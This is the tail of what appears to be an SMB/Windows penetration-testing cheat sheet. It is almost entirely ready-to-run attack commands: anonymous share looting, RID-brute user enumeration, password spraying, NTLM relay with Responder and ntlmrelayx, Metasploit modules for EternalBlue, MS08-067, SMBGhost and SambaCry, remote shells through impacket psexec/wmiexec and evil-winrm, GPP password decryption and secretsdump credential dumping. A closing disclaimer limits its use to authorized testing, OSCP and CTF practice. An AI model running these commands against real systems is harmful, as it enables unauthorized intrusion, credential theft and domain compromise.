  smbclient //<TARGET_IP>/share -N -c "prompt off; recurse on; mget *"
  smbmap -H <TARGET_IP> -u null -R sharename
  sudo mount -t cifs //<TARGET_IP>/share /mnt/x -o username=guest,password=
  netexec smb <TARGET_IP> -u user -p pass -M spider_plus

[RID CYCLING / USER ENUM]
  enum4linux -r <TARGET_IP>
  impacket-lookupsid anonymous@<TARGET_IP>
  netexec smb <TARGET_IP> -u '' -p '' --rid-brute

[PASSWORD POLICY — CHECK BEFORE SPRAYING]
  netexec smb <TARGET_IP> -u '' -p '' --pass-pol

[PASSWORD SPRAYING]
  netexec smb <TARGET_IP> -u users.txt -p 'Summer2024!'
  netexec smb <TARGET_SUBNET>/24 -u users.txt -p 'Summer2024!'
  hydra -L users.txt -p 'Summer2024!' <TARGET_IP> smb
  kerbrute passwordspray -d domain.local --dc <TARGET_IP> users.txt 'Pass!'
  netexec smb <TARGET_IP> -u users.txt -H 'NTLM_HASH'

[SMB RELAY (signing not enforced)]
  netexec smb <TARGET_SUBNET>/24 --gen-relay-list relay.txt
  sudo responder -I eth0
  impacket-ntlmrelayx -tf relay.txt -smb2support

[KNOWN EXPLOITS]
  MS17-010:  use exploit/windows/smb/ms17_010_eternalblue
  MS08-067:  use exploit/windows/smb/ms08_067_netapi
  SMBGhost:  use exploit/windows/smb/cve_2020_0796_smbghost
  SambaCry:  use exploit/linux/samba/is_known_pipename

[GET SHELL — credentialed]
  impacket-psexec  'user:pass@<TARGET_IP>'      ← SYSTEM, drops service
  impacket-wmiexec 'user:pass@<TARGET_IP>'      ← stealthier
  impacket-smbexec 'user:pass@<TARGET_IP>'      ← per-command temp service
  netexec smb <TARGET_IP> -u user -p pass -x "whoami"
  evil-winrm -i <TARGET_IP> -u user -p pass     ← if WinRM also open

[GPP / SYSVOL LOOT — Domain Controllers]
  smbclient //<TARGET_IP>/SYSVOL -U 'user%pass' -c "recurse on;prompt off;mget Groups.xml"
  gpp-decrypt "cpassword_value"
  netexec smb <TARGET_IP> -u user -p pass -M gpp_password

[POST-ACCESS — DOMAIN ENUM]
  netexec smb <TARGET_IP> -u user -p pass --users --groups --shares
  impacket-secretsdump 'user:pass@<TARGET_IP>'
  netexec smb <TARGET_IP> -u user -p pass --bloodhound -c All --dns-server <TARGET_IP>

[KEY TAKEAWAY]
  nmap -sC → null session sweep (enum4linux -a) → loot every share →
  check password policy → spray (don't brute force blindly) →
  psexec-family for shell → SYSVOL/GPP loot if it's a DC → secretsdump
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF competitions only. Always obtain written permission before testing systems you do not own.*
